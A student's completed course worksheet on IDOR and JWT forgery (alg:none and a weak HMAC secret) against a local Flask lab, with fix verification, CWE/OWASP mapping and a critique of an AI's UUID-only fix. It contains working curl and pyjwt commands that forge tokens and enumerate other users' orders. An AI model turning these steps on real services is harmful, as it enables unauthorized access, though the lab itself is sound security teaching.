# Worksheet 6 — Authentication, Sessions & Access Control (3 hrs)

> **Course:** Software Security (KOSEN69) · **Week 6**
> **Aligned:** OWASP 2025 **A01 Broken Access Control**, **A07 Authentication Failures** · **CWE-639** (IDOR), **CWE-347** (improper signature verification), **CWE-321** (weak hardcoded key)
> **Signature games:** 🗺️ **IDOR Treasure Hunt** — walk the `oid` numbers to loot orders that aren't yours · 🔏 **JWT Forgery** — mint a token you were never given.

> ⚠️ **Ethics note:** Forging tokens and accessing other users' objects is only legal in this sandbox (`vulnerable_app.py`) and your own Juice Shop. Doing it to a real service is unauthorized access. Keep all activity inside `http://localhost:8080`.

## Part 1 — Student Information

| Name | Student ID | Date | Group | AI Tools Used |
|------|-----------|------|-------|---------------|
| Sai Seng Main | 6631503085 | 2026-09-14 | | Claude / Antigravity (conceptual verification & audit) |

![Diagram of one request passing two gates: Gate 1 authentication accepts an alg:none forgery, a weak-secret forgery, and alice's real token, then Gate 2 authorization fails to check ownership so alice's valid token reads bob's /api/orders/2 as IDOR, with the solution_app.py fixes for both.](img/authn-vs-authz.svg)

## Part 2 — Lecture Questions

Answer in 2–4 sentences each.

1. Distinguish **authentication** from **authorization**. In `vulnerable_app.py`, `get_order` calls `current_user()` but ignores its result (L63) — which of the two is missing?

   **Answer:** Authentication verifies *who* the user is by validating credentials or tokens, whereas authorization verifies *what* permissions the authenticated user possesses and which specific objects they are allowed to access. In `vulnerable_app.py`, `get_order` calls `current_user()` to authenticate the bearer token, but completely ignores the returned username and fails to check whether that user owns the requested order (`order["owner"] == user`). Therefore, authorization is completely missing on the endpoint.

2. What is **IDOR** (CWE-639)? Why is `/api/orders/<oid>` exploitable, and what single check in `solution_app.py` (L64) closes it?

   **Answer:** Insecure Direct Object Reference (IDOR) occurs when an application exposes a direct identifier to an internal database object (such as an integer record ID) in a request without verifying whether the requester has permission to access that specific resource. The `/api/orders/<oid>` endpoint is exploitable because it fetches and returns the order matching `<oid>` directly from the dictionary for any valid token without checking ownership. In `solution_app.py` line 64, the check `if order["owner"] != user: return jsonify(error="forbidden"), 403` completely closes the flaw by ensuring only the verified owner can retrieve the record.

3. Explain the **`alg:none`** JWT attack. Why does listing `"none"` in `algorithms=[...]` (L55) let an attacker submit an *unsigned* token?

   **Answer:** The `alg:none` attack exploits JWT implementations that support the unsecured token specification, where the token carries no cryptographic signature. In `vulnerable_app.py` line 55, the server explicitly allows `algorithms=["none"]` and disables signature verification (`options={"verify_signature": False}`) whenever the token header specifies `alg:none`. This allows an attacker to construct a header with `{"alg": "none"}` and an arbitrary payload (such as `{"sub": "bob"}` or `{"sub": "admin"}`) followed by an empty signature (`<header>.<payload>.`), which the backend blindly decodes and trusts without validating any secret.

4. Why is the hardcoded HMAC secret `"secret"` (CWE-321) dangerous even if `alg:none` were disabled? How does a strong random secret + pinned algorithm defend the token?

   **Answer:** A predictable or hardcoded HMAC secret like `"secret"` is present in standard dictionary wordlists, allowing attackers to discover it immediately or brute-force it offline without interacting with the server. Once the secret is known, anyone can mint, sign, and tamper with valid HS256 tokens for any arbitrary identity (e.g. `admin`), completely bypassing authentication. Defending the token requires generating a cryptographically secure, high-entropy secret (e.g., a 256-bit random string loaded from environment variables/secrets manager) and pinning `algorithms=["HS256"]` on decoding so the server strictly rejects unapproved algorithms.

5. What do the JWT claims **`exp`** and **`aud`** add, and why does the secure version reject tokens that lack them?

   **Answer:** The `exp` (expiration time) claim limits the token's lifetime so that a stolen or leaked token becomes unusable after a short duration, mitigating replay attacks. The `aud` (audience) claim defines the specific intended recipient or service realm of the token, preventing a token issued for one service from being replayed against an unrelated backend service. The secure version enforces `options={"require": ["exp", "aud"]}` to prevent indefinite token persistence and cross-application privilege reuse, rejecting any token that omits these essential bounds.

## Part 3 — Hands-on Lab (150 min)

**Learning goals:** exploit IDOR, forge JWTs two ways (`alg:none` and weak secret), then prove `solution_app.py` enforces ownership and rejects forged tokens. Steps mirror `attack.md`.

**Prerequisites:** Docker + Docker Compose, `curl`, `python3` with `pyjwt`, optionally Burp Suite. Working dir: `labs/week06-authn-authz/`.

### Environment setup

```bash
cd labs/week06-authn-authz
docker compose up            # python:3.12-slim + flask + pyjwt, runs vulnerable_app.py
# vulnerable app -> http://localhost:8080   (service name: authz-lab, port 8080)
```
Optional secondary target / proxy:
```bash
docker run --rm -p 3000:3000 bkimminich/juice-shop       # -> http://localhost:3000
# Burp Suite: put the proxy listener AND the browser proxy on 127.0.0.1:8081.
# NOT 8080 — the lab app already owns host 8080 (docker-compose.yml, "8080:5000").
# Burp's own default listener is 8080, so you must change it: leave it there and
# either the listener refuses to start ("Address already in use") or, if it does
# bind, the browser's proxy address is the target's address and every request
# goes straight to the app instead of through Burp — you intercept nothing.
```

**What to submit per task:** the exact **command/token**, a **screenshot** of the JSON response, and a **2–3 sentence mitigation**.

---

**Task 0 — Onboarding (5 min).** Get alice's token (from `attack.md`):
```bash
TOKEN=$(curl -s -X POST http://localhost:8080/login \
  -H 'Content-Type: application/json' \
  -d '{"user":"alice","pw":"alicepw"}' | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')
echo "$TOKEN"
```
Confirm `/api/orders/1` returns alice's Laptop order. *Deliverable: screenshot of the token + order 1.*

- **Login Command & Token Extraction:**
  ```bash
  TOKEN=$(curl -s -X POST http://localhost:8080/login -H 'Content-Type: application/json' -d '{"user":"alice","pw":"alicepw"}' | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')
  curl -s http://localhost:8080/api/orders/1 -H "Authorization: Bearer $TOKEN"
  ```
- **Order 1 JSON Response:**
  ```json
  {"item": "Laptop", "owner": "alice", "total": 1200}
  ```
- **Screenshot:**
  ![Task 0 Output](img/Screenshot%200.png)

**Task 1 — IDOR Treasure Hunt (30 min) 🗺️.**
- *Goal:* read **bob's** order with **alice's** token.
- *Steps:*
  ```bash
  curl -s http://localhost:8080/api/orders/1 -H "Authorization: Bearer $TOKEN"   # yours
  curl -s http://localhost:8080/api/orders/2 -H "Authorization: Bearer $TOKEN"   # bob's — leaks!
  ```
- *Deliverable:* both responses + screenshot of bob's `Phone` order + why the missing ownership check (CWE-639) is the root cause.

- **Request Commands:**
  ```bash
  curl -s http://localhost:8080/api/orders/1 -H "Authorization: Bearer $TOKEN"
  curl -s http://localhost:8080/api/orders/2 -H "Authorization: Bearer $TOKEN"
  ```
- **Responses:**
  * Order 1 (alice): `{"item":"Laptop","owner":"alice","total":1200}`
  * Order 2 (bob): `{"item":"Phone","note":"FLAG{idor_demo}","owner":"bob","total":800}`
- **Why Missing Ownership Check (CWE-639) is the root cause:** Although the application authenticates the incoming JWT to ensure the caller is logged in, it never compares the authenticated identity (`user`) against the retrieved record's `owner` attribute. Because the object identifier (`oid`) in the URL directly accesses the underlying dictionary/database, any authenticated user can read any other user's private records simply by enumerating the ID numbers.
- **Mitigation (2–3 sentences):** Enforce strict server-side authorization checks on every data-access route by verifying that the authenticated user identity matches the resource's owner attribute before returning data. If the user does not own the object or lack administrative privileges, return an HTTP 403 Forbidden status. Alternatively, query objects using both the resource ID and user ID in the query filter (e.g., `WHERE id = ? AND owner_id = ?`).
- **Screenshot:**
  ![Task 1 Output](img/Screenshot%201.png)

```sim
jwt-forge
```

**Task 2 — JWT Forgery via alg:none (30 min) 🔏.**
- *Goal:* impersonate bob with an **unsigned** token (no secret needed).
- *Steps:*
  ```bash
  FORGED=$(python3 - <<'PY'
  import jwt
  print(jwt.encode({"sub": "bob"}, key="", algorithm="none"))
  PY
  )
  curl -s http://localhost:8080/api/orders/2 -H "Authorization: Bearer $FORGED"
  ```
- *Deliverable:* the forged token + screenshot of the accepted response + explanation of the `none` flaw (CWE-347).

- **Forged Token Generation Command:**
  ```bash
  FORGED=$(python3 -c 'import jwt; print(jwt.encode({"sub": "bob"}, key="", algorithm="none"))')
  curl -s http://localhost:8080/api/orders/2 -H "Authorization: Bearer $FORGED"
  ```
- **Forged Token:** `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJib2IifQ.`
- **Accepted Response:**
  ```json
  {"item": "Phone", "note": "FLAG{idor_demo}", "owner": "bob", "total": 800}
  ```
- **Explanation of the `none` flaw (CWE-347):** CWE-347 refers to improper verification of a cryptographic signature. In `vulnerable_app.py`, the backend inspects the token's unverified header and, if `alg: none` is found, decodes the token with signature verification disabled. This allows an attacker to generate an arbitrary payload claim (`sub: bob` or `sub: admin`) with an empty signature, and the application accepts it as a trusted identity.
- **Mitigation (2–3 sentences):** Disable and reject the `none` algorithm entirely in production token validation libraries. Explicitly whitelist only secure cryptographic algorithms by pinning `algorithms=["HS256"]` or `["RS256"]` and never permit the incoming token header to dictate which algorithm verification logic is applied.
- **Screenshot:**
  ![Task 2 Output](img/Screenshot%202.png)

**Task 3 — JWT Forgery via weak secret (30 min) 🔏.**
- *Goal:* sign a *valid* HS256 token because the secret is the guessable string `secret` (CWE-321).
- *Steps:*
  ```bash
  FORGED2=$(python3 - <<'PY'
  import jwt
  print(jwt.encode({"sub": "bob"}, "secret", algorithm="HS256"))
  PY
  )
  curl -s http://localhost:8080/api/orders/2 -H "Authorization: Bearer $FORGED2"
  ```
- *Deliverable:* token + screenshot + 2–3 sentences on why secret strength + key management matter.

- **Forged Token Generation Command:**
  ```bash
  FORGED2=$(python3 -c 'import jwt; print(jwt.encode({"sub": "bob"}, "secret", algorithm="HS256"))')
  curl -s http://localhost:8080/api/orders/2 -H "Authorization: Bearer $FORGED2"
  # Optional admin flag access:
  FORGED_ADMIN=$(python3 -c 'import jwt; print(jwt.encode({"sub": "admin"}, "secret", algorithm="HS256"))')
  curl -s http://localhost:8080/api/admin -H "Authorization: Bearer $FORGED_ADMIN"
  ```
- **Accepted Response:**
  * Order 2: `{"item": "Phone", "note": "FLAG{idor_demo}", "owner": "bob", "total": 800}`
  * Admin route: `{"flag": "FLAG{jwt_demo}"}`
- **Why Secret Strength and Key Management Matter (2–3 sentences):** Symmetric HMAC signing relies entirely on the secrecy and high entropy of the shared key; if the secret is weak, trivial, or hardcoded, attackers can easily recover it via dictionary attacks or repository leaks. Once the signing key is compromised, the entire security model collapses because any adversary can forge legitimate signatures for any user. Secrets must be cryptographically random (minimum 256 bits), stored outside source code in dedicated key management services or environment variables, and rotated periodically.
- **Screenshot:**
  ![Task 3 Output](img/Screenshot%203.png)

**Task 4 — Privilege/identity escalation reasoning (25 min).**
- *Goal:* combine the flaws. Using Task 2/3 you became `bob` *without his password*; using Task 1 you read objects you don't own.
- *Steps:* document the full attack chain (forge token → access any `oid`). Optionally replay the requests through **Burp Suite Repeater** and screenshot the intercepted request/response.
- *Deliverable:* a short chain diagram/paragraph + Burp (or curl) evidence.

- **Attack Chain Description:**
  1. **Reconnaissance:** The attacker accesses the application and inspects the issued JWT format and endpoints.
  2. **Identity Forgery (Authentication Bypass):** Using either the `alg:none` vulnerability or the known/cracked HMAC secret (`"secret"`), the attacker creates an arbitrary token setting `{"sub": "bob"}` or `{"sub": "admin"}` without ever possessing valid credentials.
  3. **Horizontal & Vertical Escalation (Broken Access Control / IDOR):** With the forged token in hand, the attacker accesses endpoints they should never reach:
     * Accessing horizontal user records: `GET /api/orders/2` reads bob's private order notes (`FLAG{idor_demo}`).
     * Vertical administrative privilege escalation: `GET /api/admin` with a forged `sub: admin` token returns the root flag (`FLAG{jwt_demo}`).
- **Chain Flow:**
  ```text
  [No Credentials] 
         │
         ▼ (Exploit CWE-347 alg:none OR CWE-321 weak secret)
  [Forged JWT: sub=admin]
         │
         ├──► GET /api/orders/<id> (CWE-639 IDOR -> Leaks all user orders & data)
         └──► GET /api/admin       (Vertical Escalation -> Leaks FLAG{jwt_demo})
  ```
- **Screenshot:**
  ![Task 4 Output](img/Screenshot%204.png)

**Task 5 — Defend / fix it (30 min) 🛡️.**
- *Goal:* prove `solution_app.py` blocks Tasks 1–3.
- *Steps:* stop the vulnerable container (`Ctrl-C`), then:
  ```bash
  docker compose run --rm --service-ports authz-lab bash -c "pip install --no-cache-dir flask pyjwt && python solution_app.py"
  ```
  Re-run: get a fresh alice token, then re-fire each attack. Expected: `/api/orders/2` with alice's token → **403 forbidden** (ownership check, L64); the `alg:none` token → **401 invalid token** (algorithm pinned to HS256, L50); the `"secret"` token → **401** (strong random secret + required `aud`/`exp`, L10/40).
- *Deliverable:* screenshots of the 403 and both 401s + name the fix line for each.

- **Defense Test Commands & Results:**
  1. **Test IDOR against `solution_app.py`:**
     ```bash
     ALICE_TOKEN=$(curl -s -X POST http://localhost:8080/login -H 'Content-Type: application/json' -d '{"user":"alice","pw":"alicepw"}' | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')
     curl -s http://localhost:8080/api/orders/2 -H "Authorization: Bearer $ALICE_TOKEN"
     ```
     *Output:* `{"error": "forbidden"}` with HTTP **403 Forbidden**.
     *Fix Citation:* Line 64 in `solution_app.py` (`if order["owner"] != user: return jsonify(error="forbidden"), 403`).
  2. **Test `alg:none` token against `solution_app.py`:**
     ```bash
     curl -s http://localhost:8080/api/orders/2 -H "Authorization: Bearer $FORGED"
     ```
     *Output:* `{"error": "invalid token"}` with HTTP **401 Unauthorized**.
     *Fix Citation:* Lines 49–51 in `solution_app.py` (explicitly pinning `algorithms=["HS256"]` and requiring `exp` and `aud`).
  3. **Test weak secret (`"secret"`) token against `solution_app.py`:**
     ```bash
     curl -s http://localhost:8080/api/orders/2 -H "Authorization: Bearer $FORGED2"
     ```
     *Output:* `{"error": "invalid token"}` with HTTP **401 Unauthorized**.
     *Fix Citation:* Line 10 (`SECRET = os.environ.get("JWT_SECRET") or os.urandom(32).hex()`) and Lines 38–41 (short-lived `exp` + `aud: "week06-lab"` enforcement).
- **Screenshot:**
  ![Task 5 Output](img/Screenshot%205.png)

## Part 4 — Reflection

1. **CWE/OWASP mapping:** map IDOR → **CWE-639 / A01**, the JWT forgeries → **CWE-347 & CWE-321 / A07**.

   **Answer:**
   - **IDOR (Task 1):** Maps to **CWE-639** (Authorization Bypass Through User-Controlled Key) under OWASP 2025 **A01 Broken Access Control**.
   - **JWT alg:none Forgery (Task 2):** Maps to **CWE-347** (Improper Verification of Cryptographic Signature) under OWASP 2025 **A07 Authentication Failures**.
   - **JWT Weak Secret Forgery (Task 3):** Maps to **CWE-321** (Use of Hard-coded Cryptographic Key) and **CWE-798** (Use of Hard-coded Credentials) under OWASP 2025 **A07 Authentication Failures**.

2. **Real breach:** the **2022 Optus breach** exposed millions of customer records via an exposed/poorly-authorized API endpoint where identifiers could be enumerated — a textbook broken-access-control / IDOR-style failure. In 3–4 sentences connect it to Tasks 1 and 4 of this lab. *(Alternative: the Peloton API IDOR disclosure.)*

   **Answer:** The 2022 Optus breach exposed the personal data of nearly 10 million customers because an internal customer-lookup API was published to the internet without requiring authentication or enforcing record ownership authorization. Attackers were able to sequentially iterate through customer identifier numbers and harvest identity records en masse, identically mirroring Task 1's `/api/orders/<oid>` IDOR vulnerability. This incident demonstrates that even if network endpoints are protected by perimeter defenses, failing to enforce server-side object ownership checks allows trivial enumeration scripts to cause catastrophic, organization-wide data breaches.

3. **Best mitigation:** between deny-by-default ownership checks, pinning the JWT algorithm, and a strong managed secret, which control protects the most attack surface here, and why is server-side authorization non-negotiable?

   **Answer:** Deny-by-default server-side ownership checks protect the largest attack surface because authentication alone never prevents a legitimate user from accessing unauthorized resources. Even if JWT implementation is completely flawless with unbreakable keys, authenticated users will still exploit IDOR to read other users' records unless the server validates access permissions on each object request. Server-side authorization is non-negotiable because client-supplied object identifiers can always be manipulated by users, meaning only the server can reliably enforce business logic boundaries.

## Grading rubric (100)

| Criterion | Points |
|-----------|-------:|
| Part 2 — Lecture questions (conceptual accuracy) | 20 |
| Part 3 — Exploitation + evidence (payloads/tokens + screenshots, Tasks 1–4) | 40 |
| Part 3 — Defense (Task 5: fixes proven, lines cited) | 25 |
| Part 4 — Reflection (CWE/OWASP mapping, breach, mitigation) | 15 |
| **Total** | **100** |

---

## Evidence & Integrity (required)

- **Identity proof:** every screenshot/diagram must show a terminal running `printf '%s | %s | ' "$(whoami)" '<YOUR-STUDENT-ID>'; date '+%F %T %Z'` **in the
  same image as the evidence**. When the evidence is a browser page, a DevTools panel or a
  rendered response, put that terminal **beside the browser and capture the whole screen** — a
  cropped window carries nothing that identifies you, and the lab's own output is
  byte-identical for the whole cohort *by design*, so the stamp is the only thing that makes
  the shot yours. Generic or borrowed evidence is not accepted.
- **Personalized flag (if this lab issues one):** `FLAG{idor_demo}` / `FLAG{jwt_demo}`
- **Commit Link:** https://github.com/SAISENGMAIN6631503085/software-security/commit/452e0b82031e0d7280f6177ca116bd9df2689de2
- **Pull Request:** https://github.com/nutthakorn7/software-security/pull/90
  *Flags are unique per student — submitting another student's flag is a violation. How to submit: **learn.zcr.ai/submit** (full guide: `SUBMISSION.md` in the repo root).*
- **Explain in your own words** *(graded on your reasoning, not copied text):*
  1. What did you do, and **why did the vulnerability work**?
     **Answer:** I exploited an Insecure Direct Object Reference (IDOR) by modifying the `oid` parameter to read bob's private order using alice's token, and forged JWTs by taking advantage of the insecure `alg:none` handler and the predictable `"secret"` HMAC key. The vulnerabilities worked because the application authenticated tokens without verifying whether the user owned the requested object, accepted unsigned tokens with `alg:none`, and used a trivial hardcoded key that allowed forging identity signatures offline.
  2. **Why does your fix actually stop it** — and what could still break it?
     **Answer:** The fixes in `solution_app.py` stop the attacks by verifying that `order["owner"] == user` on every object retrieval (returning 403 on mismatch), generating a strong random 256-bit secret, pinning algorithm validation strictly to `HS256`, and requiring `exp` and `aud` claims (returning 401 on forged/expired tokens). However, security could still break if new endpoints are added without ownership checks, if the secret is accidentally logged or hardcoded in client bundles, or if token revocation/blacklisting is not implemented for compromised active sessions.

---

## 🤖 Audit the AI (required)

AI is a power tool you must **distrust** — you are graded on your *critique*, not the AI's answer.

1. Ask an AI assistant to exploit **or** fix this week's vulnerability. Paste its full answer.

   **AI Prompt:** *"How do I fix IDOR in my Flask REST API where users fetch orders via `GET /api/orders/<id>`?"*

   **AI Answer:**
   > *"To fix IDOR, you should obscure the IDs so users cannot guess them. Replace auto-incrementing integer IDs with UUIDs (e.g., `uuid.uuid4()`) like `/api/orders/9b1deb4d-3b7d-4bad-9bdd-2b0d7b3dcb6d`. Because UUIDs are random and unguessable, attackers cannot enumerate other users' orders."*

2. **Find what's wrong or risky** in it — insecure code, a subtly incomplete fix, a hallucinated API/function/CVE, a missed edge case, or wrong reasoning. Quote the exact line(s).

   **Critique:**
   - **Insecure recommendation:** *"Replace auto-incrementing integer IDs with UUIDs... Because UUIDs are random and unguessable, attackers cannot enumerate other users' orders."*
   - **Flaw:** Obscurity is not authorization (OWASP Anti-Pattern). UUIDs make random brute-force enumeration harder, but they do NOT fix IDOR. If an attacker discovers or intercepts another user's UUID (via referrer headers, shared links, browser history, shoulder surfing, or API logs), the server will still serve the unauthorized data because no server-side ownership validation exists.

3. Produce the **correct, verified** version yourself and explain in 2–3 sentences why the AI's output was insufficient.

   **Verified Secure Code:**
   ```python
   @app.route("/api/orders/<int:oid>")
   def get_order(oid):
     user = current_user()  # Authenticated user
     order = ORDERS.get(oid)
     if not order:
       return jsonify(error="not found"), 404
     # Authorize ownership explicitly
     if order.get("owner") != user:
       return jsonify(error="forbidden"), 403
     return jsonify(order)
```

   **Explanation:** The AI's suggestion was insufficient because it confused identifier unpredictability with access authorization. Real authorization requires an active server-side permission check (`order["owner"] == user`) to ensure that possessing an identifier does not automatically grant access to the resource.

> Disclose your AI use in the Part 1 table. This task counts toward your **Defense + Reflection** score.

---

## 🧠 Comprehension & Prompt (required)

**A. Explain in Plain English (EiPE).** In 2–3 sentences, in your own words, describe what this week's vulnerable code/endpoint actually *does* and *why it is exploitable* — explain the mechanism, don't dump jargon.

**Answer:** The server issues digital passes (JWTs) to prove who you are, but it checks your pass using a password so simple anyone can guess it, or it allows you to show a pass with no signature at all. Furthermore, when you ask the server to show an order number, it only checks that you have a pass, but never verifies whether that order number actually belongs to you. This lets any logged-in user create fake identity passes and read anyone else's private shopping orders simply by changing the number in the web address.

**B. Prompt Problem.** Write a **single prompt** that makes an AI produce a *correct, secure* fix for one finding. Run it: does the exploit now fail? If not, refine the prompt and try again. Submit the **final prompt + the verified result**.
*Graded on the prompt's precision and your verification — this trains problem decomposition and AI literacy (Denny et al. 2024).*

**Final Prompt:**
> *"Refactor the following Python Flask endpoint to resolve CWE-639 (IDOR): `def get_order(oid): current_user(); order = ORDERS.get(oid); return jsonify(order)`. Requirements: (1) Ensure `current_user()` returns the authenticated user identity and handle invalid/missing tokens with HTTP 401; (2) Implement an explicit ownership check verifying `order['owner'] == user`; (3) Return HTTP 404 if the order does not exist and HTTP 403 if the user is not the owner; (4) Explain why changing IDs to UUIDs without ownership checks is insufficient."*

**Verified Result:**
```python
@app.route("/api/orders/<int:oid>")
def get_order(oid):
  try:
    user = current_user()
  except jwt.InvalidTokenError:
    return jsonify(error="invalid token"), 401
  order = ORDERS.get(oid)
  if not order:
    return jsonify(error="not found"), 404
  if order.get("owner") != user:
    return jsonify(error="forbidden"), 403
  return jsonify(order)
```

**Verification:** When alice accesses `/api/orders/2` (owned by bob), the endpoint immediately evaluates `order['owner'] != user` and responds with HTTP 403 Forbidden, successfully defeating the IDOR attack.
